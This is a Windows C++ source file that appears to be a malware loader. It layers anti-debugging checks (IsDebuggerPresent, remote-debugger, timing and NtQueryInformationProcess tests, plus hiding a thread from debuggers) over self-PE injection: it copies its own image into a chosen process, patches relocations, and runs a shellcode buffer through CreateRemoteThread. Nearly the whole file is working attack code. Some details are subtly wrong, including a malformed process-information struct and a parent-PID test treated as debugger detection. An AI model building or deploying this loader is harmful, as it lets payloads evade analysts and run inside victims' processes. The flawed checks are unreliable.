#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include <timeapi.h>

#include "base.cpp"

/*
    All The Anti-Debugging Techniques I Implemented Off the Rip.
    They all return true if the process is being debugged, false if not.
*/

// Function to check if the process is being debugged using IsDebuggerPresent.
bool static isDebuggerPresentBasic() {
    return IsDebuggerPresent();
}

// -----------------------------------------------------------------------------------------------


// Function to check if the process is being debugged by another process using CheckRemoteDebuggerPresent.
bool static isDebuggerPresentRemote() {
    BOOL bDebuggerPresent = FALSE;
    return (CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && bDebuggerPresent);
}

// -----------------------------------------------------------------------------------------------

// Function to check if the process is being debugged by another process using a variety of time heuristics.

bool static IsDebuggedTimeHeuristics(unsigned __int64 qwNativeElapsed, DWORD dwNativeElapsedTick, DWORD64 qwNativeElapsedQuery) {
    SYSTEMTIME stStart, stEnd;
    FILETIME ftStart, ftEnd;
    ULARGE_INTEGER uiStart, uiEnd;
    LARGE_INTEGER liStart, liEnd;

    // GetSystemTime method detection
    GetSystemTime(&stStart);
    
    // Simulate work by sleeping
    Sleep(200);

    GetSystemTime(&stEnd);

    if (!SystemTimeToFileTime(&stStart, &ftStart)) {
        return false;
    }
    if (!SystemTimeToFileTime(&stEnd, &ftEnd)) {
        return false;
    }

    uiStart.LowPart = ftStart.dwLowDateTime;
    uiStart.HighPart = ftStart.dwHighDateTime;
    uiEnd.LowPart = ftEnd.dwLowDateTime;
    uiEnd.HighPart = ftEnd.dwHighDateTime;

    if ((ULONGLONG)(uiEnd.QuadPart - uiStart.QuadPart) > qwNativeElapsed) return true;

    // GetTickCount64 method detection.
    ULONGLONG dwStartTick = GetTickCount64();

    // Simulate work by sleeping
    Sleep(200);

    if ((GetTickCount64() - dwStartTick) > dwNativeElapsedTick) return true;

    // QueryPerformanceCounter method detection.
    QueryPerformanceCounter(&liStart);
    
    // Simulate work by sleeping
    Sleep(200);
    
    QueryPerformanceCounter(&liEnd);
    if ((ULONGLONG)(liEnd.QuadPart - liStart.QuadPart) > qwNativeElapsedQuery) return true;

    return false;
}

// -----------------------------------------------------------------------------------------------

#define NtCurrentThread ((HANDLE)-2)  // Define NtCurrentThread as the current thread handle.

// Define the function prototype for NtSetInformationThread from ntdll.dll.
typedef NTSTATUS (NTAPI* pNtSetInformationThread)(
    HANDLE ThreadHandle, 
    _THREAD_INFORMATION_CLASS ThreadInformationClass,
    PVOID ThreadInformation, 
    ULONG ThreadInformationLength
);

// Function to hide the current thread from the debugger.
bool static HideThreadFromDebugger() {
    // Load ntdll.dll dynamically.
    HMODULE hNtDll = GetModuleHandle(_T("ntdll.dll"));
    if (hNtDll == NULL) return false;

    // Get the address of the NtSetInformationThread function.
    pNtSetInformationThread NtSetInformationThread = 
        (pNtSetInformationThread)GetProcAddress(hNtDll, "NtSetInformationThread");
    if (NtSetInformationThread == NULL) return false;

    NTSTATUS status = NtSetInformationThread(
        NtCurrentThread, 
        (THREAD_INFORMATION_CLASS)0x11, 
        NULL, 
        0);
    return status >= 0;
}

// -----------------------------------------------------------------------------------------------

// Advanced anti-debugging check using NtQueryInformationProcess to detect a debugger.
bool static isDebuggerPresentNtQuery() {
    typedef struct _PROCESS_BASIC_INFORMATION {
        ULONG Reserved;
        ULONG PebBaseAddress;
        ULONG AffinityMask;
        ULONG BasePriority;
        ULONG UniqueProcessId;
        ULONG InheritedFromUniqueProcessId;
    } PROCESS_BASIC_INFORMATION;
    
    typedef enum _PROCESSINFOCLASS {
        ProcessBasicInformation = 0  // Enum value for ProcessBasicInformation.
    } PROCESSINFOCLASS;

    // Define the function prototype for NtQueryInformationProcess.
    typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    
    // Get the address of NtQueryInformationProcess from ntdll.dll.
    HMODULE nHandle = GetModuleHandle(L"ntdll.dll");
    if (nHandle == 0) return false;

    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(nHandle, "NtQueryInformationProcess");
    if (NtQueryInformationProcess == NULL) {
        return false;
    }
  
    PROCESS_BASIC_INFORMATION pbi;
    ULONG len = 0;
    NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len);
    if (status != 0) return false;

    // Check if the process is running under a debugger by examining the inherited process ID.
    // Return true if the inherited process ID is non-zero (indicating a debugger).
    return pbi.InheritedFromUniqueProcessId != 0;
}

// -----------------------------------------------------------------------------------------------

bool static AntiDebug() {

    // Set the thresholds for each detection method
    unsigned __int64 qwNativeElapsed = 5000000; // 5 seconds in 100-nanosecond intervals
    DWORD dwNativeElapsedTick = 1000;    // Threshold for GetTickCount/timeGetTime in milliseconds
    unsigned __int64 qwNativeElapsedQuery = 5000000; // Threshold for QueryPerformanceCounter in high-resolution intervals

    // Check for debugger presence using a variety of time heuristics.
    if (IsDebuggedTimeHeuristics(qwNativeElapsed, dwNativeElapsedTick, qwNativeElapsedQuery)) {
        exit(-1); // If the delay indicates a debugger, exit the application.
    }

    // Check for basic debugger presence using IsDebuggerPresent function.
    if (isDebuggerPresentBasic()) {
        exit(-1);  // If a debugger is detected, exit the application.
    }

    // Check for remote debugger presence using CheckRemoteDebuggerPresent function.
    if (isDebuggerPresentRemote()) {
        exit(-1);  // If a remote debugger is detected, exit the application.
    }

    // Check for debugger presence using NtQueryInformationProcess function.
    if (isDebuggerPresentNtQuery()) {
        exit(-1);  // If a debugger is detected, exit the application.
    }

    // Hide the current thread from the debugger using NtSetInformationThread.
    if (!HideThreadFromDebugger()) {
        return false;
    }

    return true;  // Return true if no debugger is detected and thread is hidden.
}


/*

    Structural Code Necessary for Runtime

*/

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

DWORD EntryPoint() {
    (*(void(*)())(&buf))();
    return 0;
}

int main(int argc, char* argv[]) {

    // Call the AntiDebug function to check for debugging attempts.
    if (!AntiDebug()) {
        return -1;
    }

    // Stub variables are declared to hold necessary values.
    DWORD relocationEntriesCount = 0;
    PDWORD_PTR patchedAddress;
    PBASE_RELOCATION_ENTRY relocationRVA = NULL;

    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    // The provided PID argument is parsed from the command-line arguments.
    DWORD pid = strtol(argv[1], NULL, 10);
    if (pid == 0) return 1;

    // The current image's base address is obtained.
    PVOID imageBase = GetModuleHandle(NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeader->e_lfanew);

    // A new memory block is allocated sized for the PE image.
    PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
    if (localImage == NULL) return 1;

    // The PE image is copied into the allocated memory block.
    memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);

    // The target process is opened to inject the PE into it.
    HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (targetProcess == NULL) return 1;

    // A new memory block is allocated in the target process. This will be where the PE is injected.
    PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (targetImage == NULL) return 1;

    // The delta between the base addresses of the current image and the target image is calculated.
    DWORD_PTR deltaImageBase = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;

    // The local image is relocated to ensure it will have the correct addresses in the target process.
    PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    // The relocations are calculated.
    while (relocationTable->SizeOfBlock > 0) {
        relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
        relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);

        for (unsigned i = 0; i < relocationEntriesCount; i++) {
            if (relocationRVA[i].Offset) {
                // Each relocated address is patched with the calculated delta.
                patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
                *patchedAddress += deltaImageBase;
            }
        }
        // The next relocation block is processed.
        relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
    }

    // The relocated local image is written into the target process's memory.
    if (!WriteProcessMemory(targetProcess, targetImage, localImage, ntHeader->OptionalHeader.SizeOfImage, NULL)) return 1;
    
    // A remote thread is created to start the injected PE in the target process.
    if (CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)EntryPoint + deltaImageBase), NULL, 0, NULL) == NULL) return 1;

    // The handle to the target process is closed after injection is complete.
    CloseHandle(targetProcess);

    return 0;
}
